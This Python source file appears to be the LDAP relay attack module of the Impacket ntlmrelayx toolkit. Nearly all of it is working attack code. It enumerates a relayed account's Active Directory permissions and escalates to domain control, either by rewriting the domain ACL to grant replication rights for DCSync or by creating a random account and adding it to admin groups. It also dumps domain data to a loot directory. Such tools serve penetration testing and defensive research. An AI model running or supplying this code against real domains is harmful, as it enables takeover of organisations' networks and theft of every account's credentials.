# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# LDAP Attack Class
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#
# Description:
#  LDAP(s) protocol relay attack
#
# ToDo:
#
import random
import string
import thread
import ldapdomaindump
import ldap3
from impacket import LOG
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.ldap import ldaptypes
from impacket.uuid import string_to_bin, bin_to_string
from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
from pyasn1.type.namedtype import NamedTypes, NamedType
from pyasn1.type.univ import Sequence, Integer
from ldap3.utils.conv import escape_filter_chars
from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
# This is new from ldap3 v2.5
try:
    from ldap3.protocol.microsoft import security_descriptor_control
except ImportError:
    # We use a print statement because the logger is not initialized yet here
    print('Failed to import required functions from ldap3. ntlmrelayx required ldap3 >= 2.5.0. \
Please update with pip install ldap3 --upgrade')
PROTOCOL_ATTACK_CLASS = "LDAPAttack"

# Define global variables to prevent dumping the domain twice
# and to prevent privilege escalating more than once
dumpedDomain = False
alreadyEscalated = False
class LDAPAttack(ProtocolAttack):
    """
    This is the default LDAP attack. It checks the privileges of the relayed account
    and performs a domaindump if the user does not have administrative privileges.
    If the user is an Enterprise or Domain admin, a new user is added to escalate to DA.
    """
    PLUGIN_NAMES = ["LDAP", "LDAPS"]
    def __init__(self, config, LDAPClient, username):
        ProtocolAttack.__init__(self, config, LDAPClient, username)

    def addUser(self, parent, domainDumper):
        """
        Add a new user. Parent is preferably CN=Users,DC=Domain,DC=local, but can
        also be an OU or other container where we have write privileges
        """
        global alreadyEscalated
        if alreadyEscalated:
            LOG.error('New user already added. Refusing to add another')
            return

        # Random password
        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))

        # Random username
        newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))
        newUserDn = 'CN=%s,%s' % (newUser, parent)
        ucd = {
            'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % domainDumper.root,
            'distinguishedName': newUserDn,
            'cn': newUser,
            'sn': newUser,
            'givenName': newUser,
            'displayName': newUser,
            'name': newUser,
            'userAccountControl': 512,
            'accountExpires': '0',
            'sAMAccountName': newUser,
            'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
        }
        LOG.info('Attempting to create user in: %s' % parent)
        res = self.client.add(newUserDn, ['top','person','organizationalPerson','user'], ucd)
        if not res:
            # Adding users requires LDAPS
            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
                LOG.error('Failed to add a new user. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing user.')
            else:
                LOG.error('Failed to add a new user: %s' % str(self.client.result))
            return False
        else:
            LOG.info('Adding new user with username: %s and password: %s result: OK' % (newUser, newPassword))

            # Return the DN
            return newUserDn

    def addUserToGroup(self, userDn, domainDumper, groupDn):
        global alreadyEscalated
        # For display only
        groupName = groupDn.split(',')[0][3:]
        userName = userDn.split(',')[0][3:]
        # Now add the user as a member to this group
        res = self.client.modify(groupDn, {
            'member': [(ldap3.MODIFY_ADD, [userDn])]})
        if res:
            LOG.info('Adding user: %s to group %s result: OK' % (userName, groupName))
            LOG.info('Privilege escalation succesful, shutting down...')
            alreadyEscalated = True
            thread.interrupt_main()
        else:
            LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))

    def aclAttack(self, userDn, domainDumper):
        global alreadyEscalated
        if alreadyEscalated:
            LOG.error('ACL attack already performed. Refusing to continue')
            return

        # Query for the sid of our user
        self.client.search(userDn, '(objectCategory=user)', attributes=['sAMAccountName', 'objectSid'])
        entry = self.client.entries[0]
        username = entry['sAMAccountName'].value
        usersid = entry['objectSid'].value
        LOG.debug('Found sid for user %s: %s' % (username, usersid))

        # Set SD flags to only query for DACL
        controls = security_descriptor_control(sdflags=0x04)
        alreadyEscalated = True

        LOG.info('Querying domain security descriptor')
        self.client.search(domainDumper.root, '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
        entry = self.client.entries[0]
        secDescData = entry['nTSecurityDescriptor'].raw_values[0]
        secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)

        secDesc['Dacl']['Data'].append(create_object_ace('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', usersid))
        secDesc['Dacl']['Data'].append(create_object_ace('1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', usersid))
        dn = entry.entry_dn
        data = secDesc.getData()
        self.client.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
        if self.client.result['result'] == 0:
            alreadyEscalated = True
            LOG.info('Success! User %s now has Replication-Get-Changes-All privileges on the domain' % username)
            LOG.info('Try using DCSync with secretsdump.py and this user :)')
            return True
        else:
            LOG.error('Error when updating ACL: %s' % self.client.result)
            return False

    def validatePrivileges(self, uname, domainDumper):
        # Find the user's DN
        membersids = []
        sidmapping = {}
        privs = {
            'create': False, # Whether we can create users
            'createIn': None, # Where we can create users
            'escalateViaGroup': False, # Whether we can escalate via a group
            'escalateGroup': None, # The group we can escalate via
            'aclEscalate': False, # Whether we can escalate via ACL on the domain object
            'aclEscalateIn': None # The object which ACL we can edit
        }
        self.client.search(domainDumper.root, '(sAMAccountName=%s)' % escape_filter_chars(uname), attributes=['objectSid', 'primaryGroupId'])
        user = self.client.entries[0]
        usersid = user['objectSid'].value
        sidmapping[usersid] = user.entry_dn
        membersids.append(usersid)
        # The groups the user is a member of
        self.client.search(domainDumper.root, '(member:1.2.840.113556.1.4.1941:=%s)' % escape_filter_chars(user.entry_dn), attributes=['name', 'objectSid'])
        LOG.debug('User is a member of: %s' % self.client.entries)
        for entry in self.client.entries:
            sidmapping[entry['objectSid'].value] = entry.entry_dn
            membersids.append(entry['objectSid'].value)
        # Also search by primarygroupid
        # First get domain SID
        self.client.search(domainDumper.root, '(objectClass=domain)', attributes=['objectSid'])
        domainsid = self.client.entries[0]['objectSid'].value
        gid = user['primaryGroupId'].value
        # Now search for this group by SID
        self.client.search(domainDumper.root, '(objectSid=%s-%d)' % (domainsid, gid), attributes=['name', 'objectSid', 'distinguishedName'])
        group = self.client.entries[0]
        LOG.debug('User is a member of: %s' % self.client.entries)
        # Add the group sid of the primary group to the list
        sidmapping[group['objectSid'].value] = group.entry_dn
        membersids.append(group['objectSid'].value)
        controls = security_descriptor_control(sdflags=0x05) # Query Owner and Dacl
        # Now we have all the SIDs applicable to this user, now enumerate the privileges of domains and OUs
        entries = self.client.extend.standard.paged_search(domainDumper.root, '(|(objectClass=domain)(objectClass=organizationalUnit))', attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls, generator=True)
        self.checkSecurityDescriptors(entries, privs, membersids, sidmapping, domainDumper)
        # Also get the privileges on the default Users container
        entries = self.client.extend.standard.paged_search(domainDumper.root, '(&(cn=Users)(objectClass=container))', attributes=['nTSecurityDescriptor', 'objectClass'], controls=controls, generator=True)
        self.checkSecurityDescriptors(entries, privs, membersids, sidmapping, domainDumper)

        # Interesting groups we'd like to be a member of, in order of preference
        interestingGroups = [
            '%s-%d' % (domainsid, 519), # Enterprise admins
            '%s-%d' % (domainsid, 512), # Domain admins
            'S-1-5-32-544', # Built-in Administrators
            'S-1-5-32-551', # Backup operators
            'S-1-5-32-548', # Account operators
        ]
        privs['escalateViaGroup'] = False
        for group in interestingGroups:
            self.client.search(domainDumper.root, '(objectSid=%s)' % group, attributes=['nTSecurityDescriptor', 'objectClass'])
            groupdata = self.client.response
            self.checkSecurityDescriptors(groupdata, privs, membersids, sidmapping, domainDumper)
            if privs['escalateViaGroup']:
                # We have a result - exit the loop
                break
        return (usersid, privs)

    def getUserInfo(self, domainDumper, samname):
        entries = self.client.search(domainDumper.root, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
        try:
            dn = self.client.entries[0].entry_dn
            sid = self.client.entries[0]['objectSid']
            return (dn, sid)
        except IndexError:
            LOG.error('User not found in LDAP: %s' % samname)
            return False

    def checkSecurityDescriptors(self, entries, privs, membersids, sidmapping, domainDumper):
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            dn = entry['dn']
            try:
                sdData = entry['raw_attributes']['nTSecurityDescriptor'][0]
            except IndexError:
                # We don't have the privileges to read this security descriptor
                continue
            hasFullControl = False
            secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR()
            secDesc.fromString(sdData)
            if secDesc['OwnerSid'] != '' and secDesc['OwnerSid'].formatCanonical() in membersids:
                sid = secDesc['OwnerSid'].formatCanonical()
                LOG.debug('Permission found: Full Control on %s; Reason: Owner via %s' % (dn, sidmapping[sid]))
                hasFullControl = True
            # Iterate over all the ACEs
            for ace in secDesc['Dacl'].aces:
                sid = ace['Ace']['Sid'].formatCanonical()
                if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE and ace['AceType'] != ACCESS_ALLOWED_ACE.ACE_TYPE:
                    continue
                if not ace.hasFlag(ACE.INHERITED_ACE) and ace.hasFlag(ACE.INHERIT_ONLY_ACE):
                    # ACE is set on this object, but only inherited, so not applicable to us
                    continue
                # Check if the ACE has restrictions on object type
                if ace['AceType'] == ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE \
                    and ace.hasFlag(ACE.INHERITED_ACE) \
                    and ace['Ace'].hasFlag(ACCESS_ALLOWED_OBJECT_ACE.ACE_INHERITED_OBJECT_TYPE_PRESENT):
                    # Verify if the ACE applies to this object type
                    if not self.aceApplies(ace, entry['raw_attributes']['objectClass']):
                        continue

                if sid in membersids:
                    if can_create_users(ace) or hasFullControl:
                        if not hasFullControl:
                            LOG.debug('Permission found: Create users in %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
                        if dn == 'CN=Users,%s' % domainDumper.root:
                            # We can create users in the default container, this is preferred
                            privs['create'] = True
                            privs['createIn'] = dn
                        else:
                            # Could be a different OU where we have access
                            # store it until we find a better place
                            if privs['createIn'] != 'CN=Users,%s' % domainDumper.root and 'organizationalUnit' in entry['raw_attributes']['objectClass']:
                                privs['create'] = True
                                privs['createIn'] = dn
                    if can_add_member(ace) or hasFullControl:
                        if 'group' in entry['raw_attributes']['objectClass']:
                            # We can add members to a group
                            if not hasFullControl:
                                LOG.debug('Permission found: Add member to %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
                            privs['escalateViaGroup'] = True
                            privs['escalateGroup'] = dn
                    if ace['Ace']['Mask'].hasPriv(ACCESS_MASK.WRITE_DACL) or hasFullControl:
                        if not hasFullControl:
                            LOG.debug('Permission found: Write Dacl of %s; Reason: Granted to %s' % (dn, sidmapping[sid]))
                        # We can modify the domain Dacl
                        if 'domain' in entry['raw_attributes']['objectClass']:
                            privs['aclEscalate'] = True
                            privs['aclEscalateIn'] = dn

    @staticmethod
    def aceApplies(ace, objectClasses):
        '''
        Checks if an ACE applies to this object (based on object classes).
        Note that this function assumes you already verified that InheritedObjectType is set (via the flag).
        If this is not set, the ACE applies to all object types.
        '''
        objectTypeGuid = bin_to_string(ace['Ace']['InheritedObjectType']).lower()
        for objectType, guid in OBJECTTYPE_GUID_MAP.iteritems():
            if objectType in objectClasses and objectTypeGuid:
                return True
        # If none of these match, the ACE does not apply to this object
        return False


    def run(self):
        #self.client.search('dc=vulnerable,dc=contoso,dc=com', '(objectclass=person)')
        #print self.client.entries
        global dumpedDomain
        # Set up a default config
        domainDumpConfig = ldapdomaindump.domainDumpConfig()

        # Change the output directory to configured rootdir
        domainDumpConfig.basepath = self.config.lootdir

        # Create new dumper object
        domainDumper = ldapdomaindump.domainDumper(self.client.server, self.client, domainDumpConfig)
        LOG.info('Enumerating relayed user\'s privileges. This may take a while on large domains')
        userSid, privs = self.validatePrivileges(self.username, domainDumper)
        if privs['create']:
            LOG.info('User privileges found: Create user')
        if privs['escalateViaGroup']:
            name = privs['escalateGroup'].split(',')[0][3:]
            LOG.info('User privileges found: Adding user to a privileged group (%s)' % name)
        if privs['aclEscalate']:
            LOG.info('User privileges found: Modifying domain ACL')

        # We prefer ACL escalation since it is more quiet
        if self.config.aclattack and privs['aclEscalate']:
            LOG.debug('Performing ACL attack')
            if self.config.escalateuser:
                # We can escalate an existing user
                result = self.getUserInfo(domainDumper, self.config.escalateuser)
                # Unless that account does not exist of course
                if not result:
                    LOG.error('Unable to escalate without a valid user, aborting.')
                    return
                userDn, userSid = result
                # Perform the ACL attack
                self.aclAttack(userDn, domainDumper)
                return
            elif privs['create']:
                # Create a nice shiny new user for the escalation
                userDn = self.addUser(privs['createIn'], domainDumper)
                if not userDn:
                    LOG.error('Unable to escalate without a valid user, aborting.')
                    return
                # Perform the ACL attack
                self.aclAttack(userDn, domainDumper)
                return
            else:
                LOG.error('Cannot perform ACL escalation because we do not have create user '\
                    'privileges. Specify a user to assign privileges to with --escalate-user')

        # If we can't ACL escalate, try adding us to a privileged group
        if self.config.addda and privs['escalateViaGroup']:
            LOG.debug('Performing Group attack')
            if self.config.escalateuser:
                # We can escalate an existing user
                result = self.getUserInfo(domainDumper, self.config.escalateuser)
                # Unless that account does not exist of course
                if not result:
                    LOG.error('Unable to escalate without a valid user, aborting.')
                    return
                userDn, userSid = result
                # Perform the Group attack
                self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
                return
            elif privs['create']:
                # Create a nice shiny new user for the escalation
                userDn = self.addUser(privs['createIn'], domainDumper)
                if not userDn:
                    LOG.error('Unable to escalate without a valid user, aborting.')
                    return
                # Perform the Group attack
                self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])
                return
            else:
                LOG.error('Cannot perform ACL escalation because we do not have create user '\
                    'privileges. Specify a user to assign privileges to with --escalate-user')

        # Last attack, dump the domain if no special privileges are present
        if not dumpedDomain and self.config.dumpdomain:
            # Do this before the dump is complete because of the time this can take
            dumpedDomain = True
            LOG.info('Dumping domain info for first time')
            domainDumper.domainDump()
            LOG.info('Domain info dumped into lootdir!')

# Create an object ACE with the specified privguid and our sid
def create_object_ace(privguid, sid):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
    acedata['ObjectType'] = string_to_bin(privguid)
    acedata['InheritedObjectType'] = ''
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    nace['Ace'] = acedata
    return nace

# Check if an ACE allows for creation of users
def can_create_users(ace):
    createprivs = ace['Ace']['Mask'].hasPriv(ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CREATE_CHILD)
    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == '':
        return False
    userprivs = bin_to_string(ace['Ace']['ObjectType']).lower() == 'bf967aba-0de6-11d0-a285-00aa003049e2'
    return createprivs and userprivs

# Check if an ACE allows for adding members
def can_add_member(ace):
    writeprivs = ace['Ace']['Mask'].hasPriv(ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP)
    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == '':
        return writeprivs
    userprivs = bin_to_string(ace['Ace']['ObjectType']).lower() == 'bf9679c0-0de6-11d0-a285-00aa003049e2'
    return writeprivs and userprivs
